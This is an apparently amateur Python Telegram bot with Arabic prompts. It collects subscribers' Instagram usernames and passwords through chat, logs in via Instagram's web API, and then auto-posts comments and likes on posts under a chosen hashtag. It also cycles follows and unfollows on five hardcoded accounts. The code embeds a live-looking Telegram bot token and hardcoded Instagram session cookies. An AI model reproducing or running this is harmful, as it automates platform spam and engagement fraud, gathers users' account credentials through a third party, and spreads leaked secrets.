import os

try:
    import requests
except ImportError:
    os.system("pip install requests")
import requests
from time import sleep
import re
import telebot
from telebot import types

idi = 209501902
bot = telebot.TeleBot("1143370554:AAEC2uzFqX3_CmWgrSCtZ_mX1Cp9NV6_Mxs")
r1 = requests.session()
open('instagrm.txt', 'a').write('')
q = []


@bot.message_handler(commands=['start'])
def key(msg):
    ch = msg.chat.id
    if f'{ch}\n' in open('instagrm.txt', 'r') or ch == idi:
        markup = types.ForceReply(selective=False)
        bot.send_message(msg.chat.id, 'اهلا و سهلا بك ايها المستخدم في بوت التفاعل✨')
        bot.send_message(msg.chat.id, 'ارسل يوزرك 💚', reply_markup=markup)
    else:
        a = types.InlineKeyboardMarkup()
        a1 = types.InlineKeyboardButton('المطور💚 ', url="https://t.me/Q5QQQQ")
        a.add(a1)
        bot.send_message(ch, 'يجب عليك الاشتراك اولا عن طريق ارسال الكود الى المطور ', reply_markup=a)
        bot.send_message(ch, f'كود الاشتراك الخاص بك : {ch}')


@bot.message_handler(commands=['add'])
def key(msg):
    markup = types.ForceReply(selective=False)
    if msg.chat.id == idi:
        bot.send_message(msg.chat.id, 'اضف المشترك💚', reply_markup=markup)


@bot.message_handler(commands=['member'])
def key(msg):
    v = open('instagrm.txt', 'r').readlines()
    bot.send_message(msg.chat.id, len(v))


@bot.message_handler(content_types='text')
def an(msg):
    x = msg.text
    ch = msg.chat.id
    markup = types.ForceReply(selective=False)
    try:
        if msg.reply_to_message.text == 'اضف المشترك💚':
            x = msg.text
            open('instagrm.txt', 'a').write(f'{x}\n')
            bot.send_message(x, 'تم تفعيل لك البوت💚 ')
    except:
        pass
    try:
        if msg.reply_to_message.text == "ارسل يوزرك 💚":
            if ch in q:
                z = q.index(ch)
                q.remove(z)
                q.remove(z)
                q.remove(z)
                q.remove(z)
                q.remove(z)
            else:
                q.append(ch)
            global user
            user = x
            q.append(user)
            bot.send_message(msg.chat.id, 'ارسل رمز حسابك 💚', reply_markup=markup)
    except:
        pass
    try:
        if msg.reply_to_message.text == "تم تسجيل الدخول بنجاح\nارسل الهاشتاك المراد التفاعل به💟":
            global hash
            if x[0] == '#':
                hash = x[1:]
                q.append(hash)
            else:
                hash = x
                q.append(hash)
            bot.send_message(msg.chat.id, 'ارسل تعليقك 📝', reply_markup=markup)
    except:
        pass
    try:
        if msg.reply_to_message.text == "ارسل تعليقك 📝":
            global hashtag, comment
            com = x
            q.append(com)
            # open('msg.txt', 'a', encoding='UTF-8').write(f':{x}')
            bot.reply_to(msg, 'حسنا سيتم بدء التفاعل ☑️')
            # j = open('msg.txt', 'r', encoding='UTF-8').read()
            hashtag = hash
            comment = com
    except:
        pass
    try:
        if msg.reply_to_message.text == "ارسل رمز حسابك 💚":
            pswd = x
            q.append(pswd)
            # open('msg.txt', 'a').write(x)
            # j = open('msg.txt', 'r').read()
            username = user
            password = pswd
            login_url = 'https://www.instagram.com/accounts/login/ajax/'
            login_headers = {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9',
                'content-length': '275',
                'content-type': 'application/x-www-form-urlencoded',
                'cookie': 'ig_did=303991DA-0420-41AC-A26D-D9F27C8DF624; mid=X0padwAEAAEPS5xI4RZu1YV6z7zS; rur=ASH; csrftoken=xX0K5q7XikrU1LAnenqEVKqb7J3qK4S6; urlgen="{\"185.88.26.35\": 201031}:1kC1CG:D41DVXmf-j-T5nYho3c7g7K3MQU"',
                'origin': 'https://www.instagram.com',
                'referer': 'https://www.instagram.com/',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36',
                'x-csrftoken': 'xX0K5q7XikrU1LAnenqEVKqb7J3qK4S6',
                'x-ig-app-id': '936619743392459',
                'x-ig-www-claim': 'hmac.AR3tv9HzzLkZIUlGMRu3lzHfEeePw9CgWg8cuXGO22LfU8x0',
                'x-instagram-ajax': '0c15f4d7d44a',
                'x-requested-with': 'XMLHttpRequest'
            }
            login_data = {
                'username': f'{username}',
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1589682409:{password}',
                'queryParams': '{}',
                'optIntoOneTap': 'false'
            }
            global login_to_acc
            login_to_acc = r1.post(login_url, data=login_data, headers=login_headers)

            if login_to_acc.content == b'{"user": false, "authenticated": false, "status": "ok"}':
                bot.send_message(msg.chat.id, 'تاكد من اليوزر ثم قم باعاده المحاوله 🌀')
                print("[!] Check Your Username And Try Again")
            elif login_to_acc.content == b'{"user": true, "authenticated": false, "status": "ok"}':
                bot.reply_to(msg, 'تاكد من الرمز الذي ادخلته ❗️')

                print("[!] Check Yo Password And Try Again")
            elif ('{"message": "checkpoint_required"') in login_to_acc.text:
                bot.reply_to(msg, 'قم بالتاكد من حسابك عن طريق دخول برنامج الانستا 🚸')
            elif 'userId' in login_to_acc.text:
                bot.send_message(msg.chat.id, 'تم تسجيل الدخول بنجاح\nارسل الهاشتاك المراد التفاعل به💟',
                                 reply_markup=markup)

            else:
                bot.reply_to(msg, 'هنالك خطا ❌')
            try:
                ig_did = login_to_acc.cookies['ds_user_id']
                csrftoken = login_to_acc.cookies['csrftoken']
                sessionid = login_to_acc.cookies['sessionid']
            except:
                pass
    except:
        pass
    try:
        print(q)
        h = q.index(ch)
        url = f'https://www.instagram.com/explore/tags/{q[h + 3]}/?__a=1'
        x = r1.get(url).json()
        x = x['graphql']['hashtag']['edge_hashtag_to_media']['edges']
        v = []
        w = []
        for i in x:
            global a, r
            a = len(v)
            r = len(w)
            if len(v) == 11:
                break
            else:
                url1 = f"https://www.instagram.com/web/comments/{i['node']['id']}/add/"
                head1 = {
                    'accept': '*/*',
                    'accept-encoding': 'gzip, deflate, br',
                    'accept-language': 'en-US,en;q=0.9',
                    'content-length': '38',
                    'content-type': 'application/x-www-form-urlencoded',
                    'cookie': 'ig_did=EDC7FE1B-9EAA-4086-9FB9-CE9CC4891AA1; mid=X7-grwAEAAHIBy6aN0s2Pfinqt78; ig_nrcb=1; ds_user_id=43979535073; csrftoken=w8o85Yg3ZdvumwfPPTbUjX5KCouol1os; sessionid=43979535073%3AFCewAplGNTlIjG%3A17; shbid=19915; shbts=1607523548.4707706; rur=NAO; urlgen="{\"142.93.176.154\"',
                    'origin': 'https://www.instagram.com',
                    'referer': 'https://www.instagram.com/p/CIk_sHmFPOV/',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36',
                    'x-csrftoken': 'w8o85Yg3ZdvumwfPPTbUjX5KCouol1os',
                    'x-ig-app-id': '936619743392459',
                    'x-ig-www-claim': 'hmac.AR23xIF4vqkna9vUUPdTH-tcaUhsYyRw5KN7GvmcfVI0SrE0',
                    'x-instagram-ajax': '7e63b708ea25',
                    'x-requested-with': 'XMLHttpRequest'
                }
                data = {
                    'comment_text': q[h + 4],
                    'replied_to_comment_id': ''
                }
                r1.post(url=url1, headers=head1, data=data)
                w.append(1)
                bot.edit_message_text(chat_id=ch, message_id=msg.message_id + 1, text=f'commont = {len(w)} \nlikes = {len(v)}\nfollow = 0')
                sleep(30)
                url = f"https://www.instagram.com/web/likes/{i['node']['id']}/like/"
                head = {
                    'accept': '*/*',
                    'accept-encoding': 'gzip, deflate, br',
                    'accept-language': 'en-US,en;q=0.9',
                    'content-length': '0',
                    'content-type': 'application/x-www-form-urlencoded',
                    'cookie': 'ig_did=EDC7FE1B-9EAA-4086-9FB9-CE9CC4891AA1; mid=X7-grwAEAAHIBy6aN0s2Pfinqt78; ig_nrcb=1; ds_user_id=43979535073; csrftoken=w8o85Yg3ZdvumwfPPTbUjX5KCouol1os; sessionid=43979535073%3AFCewAplGNTlIjG%3A17; shbid=19915; shbts=1607523548.4707706; rur=NAO; urlgen="{\"142.93.176.154\": 14061}:1kn0Jy:HBU7WVbyf1Xn9AVcdiUGoEAwcts"',
                    'origin': 'https://www.instagram.com',
                    'referer': 'https://www.instagram.com/p/CIk_sHmFPOV/',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36',
                    'x-csrftoken': 'w8o85Yg3ZdvumwfPPTbUjX5KCouol1os',
                    'x-ig-app-id': '936619743392459',
                    'x-ig-www-claim': 'hmac.AR23xIF4vqkna9vUUPdTH-tcaUhsYyRw5KN7GvmcfVI0SrE0',
                    'x-instagram-ajax': '7e63b708ea25',
                    'x-requested-with': 'XMLHttpRequest'
                }
                r1.post(url=url, headers=head)
                v.append(1)
                bot.edit_message_text(chat_id=ch, message_id=msg.message_id + 1, text=f'commont = {len(w)} \nlikes = {len(v)}\nfollow = 0')
                sleep(20)
    except:
        pass
    try:
        head = {
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9',
            'content-length': '0',
            'content-type': 'application/x-www-form-urlencoded',
            'cookie': 'ig_did=EDC7FE1B-9EAA-4086-9FB9-CE9CC4891AA1; mid=X7-grwAEAAHIBy6aN0s2Pfinqt78; ig_nrcb=1; ds_user_id=43979535073; csrftoken=w8o85Yg3ZdvumwfPPTbUjX5KCouol1os; sessionid=43979535073%3AFCewAplGNTlIjG%3A17; shbid=19915; shbts=1607523548.4707706; rur=NAO; urlgen="{\"142.93.176.154\"',
            'origin': 'https://www.instagram.com',
            'referer': 'https://www.instagram.com/p/CIkoiB9AmNI/',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36',
            'x-csrftoken': 'w8o85Yg3ZdvumwfPPTbUjX5KCouol1os',
            'x-ig-app-id': '936619743392459',
            'x-ig-www-claim': 'hmac.AR23xIF4vqkna9vUUPdTH-tcaUhsYyRw5KN7GvmcfVI0SrE0',
            'x-instagram-ajax': '7e63b708ea25',
            'x-requested-with': 'XMLHttpRequest'
        }
        try:
            url = 'https://www.instagram.com/web/friendships/1925510241/unfollow/'
            r1.post(url, headers=head)
            sleep(40)
            url = 'https://www.instagram.com/web/friendships/534649695/unfollow/'
            r1.post(url, headers=head)
            sleep(40)
            url = 'https://www.instagram.com/web/friendships/407474340/unfollow/'
            r1.post(url, headers=head)
            sleep(40)
            url = 'https://www.instagram.com/web/friendships/309511113/unfollow/'
            r1.post(url, headers=head)
            sleep(40)
            url = 'https://www.instagram.com/web/friendships/1782581874/unfollow/'
            r1.post(url, headers=head)
            sleep(40)
        except:
            pass
        sleep(50)
        try:
            url = 'https://www.instagram.com/web/friendships/1925510241/follow/'
            r1.post(url, headers=head)
            bot.edit_message_text(chat_id=ch, message_id=msg.message_id + 1,
                                  text=f'commont = {r} \nlikes = {a}\nfollow = 1')
            sleep(50)
            url = 'https://www.instagram.com/web/friendships/534649695/follow/'
            r1.post(url, headers=head)
            bot.edit_message_text(chat_id=ch, message_id=msg.message_id + 1,
                                  text=f'commont = {r} \nlikes = {a}\nfollow = 2')
            sleep(50)
            url = 'https://www.instagram.com/web/friendships/407474340/follow/'
            r1.post(url, headers=head)
            bot.edit_message_text(chat_id=ch, message_id=msg.message_id + 1,
                                  text=f'commont = {r} \nlikes = {a}\nfollow = 3')
            sleep(50)
            url = 'https://www.instagram.com/web/friendships/309511113/follow/'
            r1.post(url, headers=head)
            bot.edit_message_text(chat_id=ch, message_id=msg.message_id + 1,
                                  text=f'commont = {r} \nlikes = {a}\nfollow = 4')
            sleep(50)
            url = 'https://www.instagram.com/web/friendships/1782581874/follow/'
            r1.post(url, headers=head)
            bot.edit_message_text(chat_id=ch, message_id=msg.message_id + 1,
                                  text=f'commont = {r} \nlikes = {a}\nfollow = 5')
            j = types.InlineKeyboardMarkup()
            j1 = types.InlineKeyboardButton(f'اضغط لاعادة التفاعل 💚', callback_data='j1')
            j.add(j1)
            bot.send_message(ch, 'تم انهاء التفاعل بنجاح 💚', reply_markup=j)
        except:
            pass
    except:
        pass


@bot.callback_query_handler(lambda call: True)
def ca(call):
    ch = call.message.chat.id
    if ch in q:
        ms = call.message.message_id
        h = q.index(ch)
        username = q[h + 1]
        password = q[h + 2]
        login_url = 'https://www.instagram.com/accounts/login/ajax/'
        login_headers = {
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9',
            'content-length': '275',
            'content-type': 'application/x-www-form-urlencoded',
            'cookie': 'ig_did=303991DA-0420-41AC-A26D-D9F27C8DF624; mid=X0padwAEAAEPS5xI4RZu1YV6z7zS; rur=ASH; csrftoken=xX0K5q7XikrU1LAnenqEVKqb7J3qK4S6; urlgen="{\"185.88.26.35\": 201031}:1kC1CG:D41DVXmf-j-T5nYho3c7g7K3MQU"',
            'origin': 'https://www.instagram.com',
            'referer': 'https://www.instagram.com/',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36',
            'x-csrftoken': 'xX0K5q7XikrU1LAnenqEVKqb7J3qK4S6',
            'x-ig-app-id': '936619743392459',
            'x-ig-www-claim': 'hmac.AR3tv9HzzLkZIUlGMRu3lzHfEeePw9CgWg8cuXGO22LfU8x0',
            'x-instagram-ajax': '0c15f4d7d44a',
            'x-requested-with': 'XMLHttpRequest'
        }
        login_data = {
            'username': f'{username}',
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1589682409:{password}',
            'queryParams': '{}',
            'optIntoOneTap': 'false'
        }
        global login_to_acc
        login_to_acc = r1.post(login_url, data=login_data, headers=login_headers)

        if login_to_acc.content == b'{"user": false, "authenticated": false, "status": "ok"}':
            bot.send_message(ch, 'تاكد من اليوزر ثم قم باعاده المحاوله 🌀')
            print("[!] Check Your Username And Try Again")
        elif login_to_acc.content == b'{"user": true, "authenticated": false, "status": "ok"}':
            bot.reply_to(ch, 'تاكد من الرمز الذي ادخلته ❗️')

            print("[!] Check Yo Password And Try Again")
        elif ('{"message": "checkpoint_required"') in login_to_acc.text:
            bot.reply_to(ch, 'قم بالتاكد من حسابك عن طريق دخول برنامج الانستا 🚸')
        elif 'userId' in login_to_acc.text:
            bot.send_message(ch, f'سيتم التفاعل من جديد 💟\n{username}')

        else:
            bot.send_message(ch, 'هنالك خطا ❌')
        try:
            ig_did = login_to_acc.cookies['ds_user_id']
            csrftoken = login_to_acc.cookies['csrftoken']
            sessionid = login_to_acc.cookies['sessionid']
        except:
            pass
    try:
        print(q)
        h = q.index(ch)
        url = f'https://www.instagram.com/explore/tags/{q[h + 3]}/?__a=1'
        x = r1.get(url).json()
        x = x['graphql']['hashtag']['edge_hashtag_to_media']['edges']
        v = []
        w = []
        for i in x:
            global a, r
            a = len(v)
            r = len(w)
            if len(v) == 11:
                break
            else:
                url1 = f"https://www.instagram.com/web/comments/{i['node']['id']}/add/"
                head1 = {
                    'accept': '*/*',
                    'accept-encoding': 'gzip, deflate, br',
                    'accept-language': 'en-US,en;q=0.9',
                    'content-length': '38',
                    'content-type': 'application/x-www-form-urlencoded',
                    'cookie': 'ig_did=EDC7FE1B-9EAA-4086-9FB9-CE9CC4891AA1; mid=X7-grwAEAAHIBy6aN0s2Pfinqt78; ig_nrcb=1; ds_user_id=43979535073; csrftoken=w8o85Yg3ZdvumwfPPTbUjX5KCouol1os; sessionid=43979535073%3AFCewAplGNTlIjG%3A17; shbid=19915; shbts=1607523548.4707706; rur=NAO; urlgen="{\"142.93.176.154\"',
                    'origin': 'https://www.instagram.com',
                    'referer': 'https://www.instagram.com/p/CIk_sHmFPOV/',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36',
                    'x-csrftoken': 'w8o85Yg3ZdvumwfPPTbUjX5KCouol1os',
                    'x-ig-app-id': '936619743392459',
                    'x-ig-www-claim': 'hmac.AR23xIF4vqkna9vUUPdTH-tcaUhsYyRw5KN7GvmcfVI0SrE0',
                    'x-instagram-ajax': '7e63b708ea25',
                    'x-requested-with': 'XMLHttpRequest'
                }
                data = {
                    'comment_text': q[h + 4],
                    'replied_to_comment_id': ''
                }
                r1.post(url=url1, headers=head1, data=data)
                w.append(1)
                bot.edit_message_text(chat_id=ch, message_id=ms + 1, text=f'commont = {len(w)} \nlikes = {len(v)}\nfollow = 0')
                sleep(30)
                url = f"https://www.instagram.com/web/likes/{i['node']['id']}/like/"
                head = {
                    'accept': '*/*',
                    'accept-encoding': 'gzip, deflate, br',
                    'accept-language': 'en-US,en;q=0.9',
                    'content-length': '0',
                    'content-type': 'application/x-www-form-urlencoded',
                    'cookie': 'ig_did=EDC7FE1B-9EAA-4086-9FB9-CE9CC4891AA1; mid=X7-grwAEAAHIBy6aN0s2Pfinqt78; ig_nrcb=1; ds_user_id=43979535073; csrftoken=w8o85Yg3ZdvumwfPPTbUjX5KCouol1os; sessionid=43979535073%3AFCewAplGNTlIjG%3A17; shbid=19915; shbts=1607523548.4707706; rur=NAO; urlgen="{\"142.93.176.154\": 14061}:1kn0Jy:HBU7WVbyf1Xn9AVcdiUGoEAwcts"',
                    'origin': 'https://www.instagram.com',
                    'referer': 'https://www.instagram.com/p/CIk_sHmFPOV/',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36',
                    'x-csrftoken': 'w8o85Yg3ZdvumwfPPTbUjX5KCouol1os',
                    'x-ig-app-id': '936619743392459',
                    'x-ig-www-claim': 'hmac.AR23xIF4vqkna9vUUPdTH-tcaUhsYyRw5KN7GvmcfVI0SrE0',
                    'x-instagram-ajax': '7e63b708ea25',
                    'x-requested-with': 'XMLHttpRequest'
                }
                r1.post(url=url, headers=head)
                v.append(1)
                bot.edit_message_text(chat_id=ch, message_id=ms + 1, text=f'commont = {len(w)} \nlikes = {len(v)}\nfollow = 0')
                sleep(20)
    except:
        pass
    try:
        head = {
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9',
            'content-length': '0',
            'content-type': 'application/x-www-form-urlencoded',
            'cookie': 'ig_did=EDC7FE1B-9EAA-4086-9FB9-CE9CC4891AA1; mid=X7-grwAEAAHIBy6aN0s2Pfinqt78; ig_nrcb=1; ds_user_id=43979535073; csrftoken=w8o85Yg3ZdvumwfPPTbUjX5KCouol1os; sessionid=43979535073%3AFCewAplGNTlIjG%3A17; shbid=19915; shbts=1607523548.4707706; rur=NAO; urlgen="{\"142.93.176.154\"',
            'origin': 'https://www.instagram.com',
            'referer': 'https://www.instagram.com/p/CIkoiB9AmNI/',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36',
            'x-csrftoken': 'w8o85Yg3ZdvumwfPPTbUjX5KCouol1os',
            'x-ig-app-id': '936619743392459',
            'x-ig-www-claim': 'hmac.AR23xIF4vqkna9vUUPdTH-tcaUhsYyRw5KN7GvmcfVI0SrE0',
            'x-instagram-ajax': '7e63b708ea25',
            'x-requested-with': 'XMLHttpRequest'
        }
        try:
            url = 'https://www.instagram.com/web/friendships/1925510241/unfollow/'
            r1.post(url, headers=head)
            sleep(40)
            url = 'https://www.instagram.com/web/friendships/534649695/unfollow/'
            r1.post(url, headers=head)
            sleep(40)
            url = 'https://www.instagram.com/web/friendships/407474340/unfollow/'
            r1.post(url, headers=head)
            sleep(40)
            url = 'https://www.instagram.com/web/friendships/309511113/unfollow/'
            r1.post(url, headers=head)
            sleep(40)
            url = 'https://www.instagram.com/web/friendships/1782581874/unfollow/'
            r1.post(url, headers=head)
            sleep(40)
        except:
            pass
        sleep(50)
        try:
            url = 'https://www.instagram.com/web/friendships/1925510241/follow/'
            r1.post(url, headers=head)
            bot.edit_message_text(chat_id=ch, message_id=ms + 1,
                                  text=f'commont = {r} \nlikes = {a}\nfollow = 1')
            sleep(50)
            url = 'https://www.instagram.com/web/friendships/534649695/follow/'
            r1.post(url, headers=head)
            bot.edit_message_text(chat_id=ch, message_id=ms + 1,
                                  text=f'commont = {r} \nlikes = {a}\nfollow = 2')
            sleep(50)
            url = 'https://www.instagram.com/web/friendships/407474340/follow/'
            r1.post(url, headers=head)
            bot.edit_message_text(chat_id=ch, message_id=ms + 1,
                                  text=f'commont = {r} \nlikes = {a}\nfollow = 3')
            sleep(50)
            url = 'https://www.instagram.com/web/friendships/309511113/follow/'
            r1.post(url, headers=head)
            bot.edit_message_text(chat_id=ch, message_id=ms + 1,
                                  text=f'commont = {r} \nlikes = {a}\nfollow = 4')
            sleep(50)
            url = 'https://www.instagram.com/web/friendships/1782581874/follow/'
            r1.post(url, headers=head)
            bot.edit_message_text(chat_id=ch, message_id=ms + 1,
                                  text=f'commont = {r} \nlikes = {a}\nfollow = 5')
            j = types.InlineKeyboardMarkup()
            j1 = types.InlineKeyboardButton(f'اضغط لاعادة التفاعل 💚', callback_data='j1')
            j.add(j1)
            bot.send_message(ch, 'تم انهاء التفاعل بنجاح 💚', reply_markup=j)
        except:
            pass
    except:
        pass


bot.polling()
